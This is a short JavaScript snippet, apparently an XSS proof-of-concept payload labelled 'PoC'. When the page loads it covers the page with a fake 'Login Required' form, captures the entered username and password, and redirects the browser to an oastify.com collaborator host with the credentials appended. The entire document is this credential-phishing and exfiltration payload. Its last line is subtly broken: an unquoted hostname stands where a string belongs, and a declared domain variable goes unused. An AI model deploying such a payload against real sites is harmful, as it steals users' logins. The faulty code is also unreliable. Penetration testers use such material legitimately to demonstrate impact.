window.onload = function() {
document.body.innerHTML += `
<div style="text-align:center;position:fixed;width:100%;top:0px;margin:0px;min-height:200px;height:100%;z-index:999;">
    <div
        style="position:fixed;left:50%;-ms-transform:translateX(-50%);-moz-transform:translateX(-50%);-webkit-transform:translateX(-50%);transform:translateX(-50%);margin:5% auto;padding:1%;background-color:#FFF;z-index:9999;border:1px solid #000;border-radius:4px">
        <h2>Login Required</h2>
        <div style="padding:2%">
            <div>Username/email:</div><input type="text" id="aaaa">
        </div>
        <div style="padding:2%">
            <div>Password:</div><input type="password" id="bbbb">
        </div>
        <div style="padding:2%"><input type="submit" id="cccc"></div>
    </div>
</div>
`

document.querySelector('#cccc').addEventListener('click', function() {
    var credentials = document.getElementById('aaaa').value + ':' + document.getElementById('bbbb').value

    alert('PoC; Credentials (' + credentials + ') captured and will be sent to remote endpoint! (click OK then check the address bar)');

    var collabDomain = 'example1t8d.oastify.com'
    location = 'https://' + uzx2c90b4mma0pvt3p8mhivsfjla94xt.oastify.com + '/?' + encodeURIComponent(credentials)
});
};
